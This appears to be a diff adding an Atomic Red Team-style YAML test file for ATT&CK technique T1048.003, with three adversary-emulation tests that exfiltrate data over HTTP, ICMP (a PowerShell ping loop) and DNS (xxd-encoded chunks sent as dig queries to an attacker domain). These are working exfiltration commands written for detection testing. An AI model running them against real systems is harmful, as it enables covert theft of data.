@@ -1,0 +1,58 @@
+attack_technique: T1048.003
+display_name: "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
+atomic_tests:
+- name: Exfiltration Over Alternative Protocol - HTTP
+  auto_generated_guid: 1d1abbd6-a3d3-4b2e-bef5-c59293f46eff
+  description: |
+    A firewall rule (iptables or firewalld) will be needed to allow exfiltration on port 1337.
+
+    Upon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.
+  supported_platforms:
+  - macos
+  - linux
+  executor:
+    steps: |
+      1. Victim System Configuration:
+
+          mkdir /tmp/victim-staging-area
+          echo "this file will be exfiltrated" > /tmp/victim-staging-area/victim-file.txt
+
+      2. Using Python to establish a one-line HTTP server on victim system:
+
+          cd /tmp/victim-staging-area
+          python -m SimpleHTTPServer 1337
+
+      3. To retrieve the data from an adversary system:
+
+          wget http://VICTIM_IP:1337/victim-file.txt
+    name: manual
+- name: Exfiltration Over Alternative Protocol - ICMP
+  auto_generated_guid: dd4b4421-2e25-4593-90ae-7021947ad12e
+  description: |
+    Exfiltration of specified file over ICMP protocol.
+
+    Upon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.
+  supported_platforms:
+  - windows
+  input_arguments:
+    input_file:
+      description: Path to file to be exfiltrated.
+      type: Path
+      default: C:\Windows\System32\notepad.exe
+    ip_address:
+      description: Destination IP address where the data should be sent.
+      type: String
+      default: 127.0.0.1
+  executor:
+    command: |
+      $ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) }
+    name: powershell
+- name: Exfiltration Over Alternative Protocol - DNS
+  auto_generated_guid: c403b5a4-b5fc-49f2-b181-d1c80d27db45
+  description: |
+    Exfiltration of specified file over DNS protocol.
+  supported_platforms:
+  - linux
+  executor:
+    steps: "1. On the adversary machine run the below command.\n\n    tshark -f \"udp port 53\" -Y \"dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches \".domain\"\" >> received_data.txt\n\n2. On the victim machine run the below commands.\n\n    xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done\n    \n3. Once the data is received, use the below command to recover the data.\n\n    cat output_file | cut -d \"A\" -f 2 | cut -d \" \" -f 2 | cut -d \".\" -f 1 | sort | uniq | xxd -p -r\n"
+    name: manual
